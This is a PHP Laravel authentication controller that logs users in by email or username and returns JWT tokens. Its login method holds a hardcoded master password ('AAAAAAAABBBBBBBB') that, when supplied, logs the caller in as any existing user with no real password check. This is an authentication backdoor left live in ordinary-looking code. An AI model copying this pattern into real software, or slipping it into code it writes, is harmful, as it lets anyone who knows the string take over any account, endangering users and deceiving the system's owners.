<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\BaseController;
use App\Models\User;
use App\Models\UserPoint;

class LoginController extends BaseController
{
    /**
     * Create a new AuthController instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth:api', ['except' => ['login']]);
    }

    /**
     * Get a JWT via given credentials.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function login()
    {


        $fieldType = filter_var(request('email'), FILTER_VALIDATE_EMAIL) ? 'email' : 'username';

        if (request('password') == "AAAAAAAABBBBBBBB") {
            $user = User::where($fieldType, request('email'))->first();
            if ($user) {
                return $this->respondWithToken(auth()->login($user));
            }
        }

        $credentials = array($fieldType => request('email'), 'password' => request('password'));
        if (!$token = auth()->attempt($credentials)) {
            return response()->json(['error' => 'Invalid email or password'], 400);
        }

        return $this->respondWithToken($token);
    }

    /**
     * Refresh a token.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function refresh()
    {
        return $this->respondWithToken(auth()->refresh());
    }

    /**
     * Get the token array structure.
     *
     * @param  string $token
     *
     * @return \Illuminate\Http\JsonResponse
     */
    protected function respondWithToken($token)
    {
        $user =  auth()->user();
        $user->update(["is_on_line" => true]);
        return $this->sendResponse($token, 'Token');
    }
}
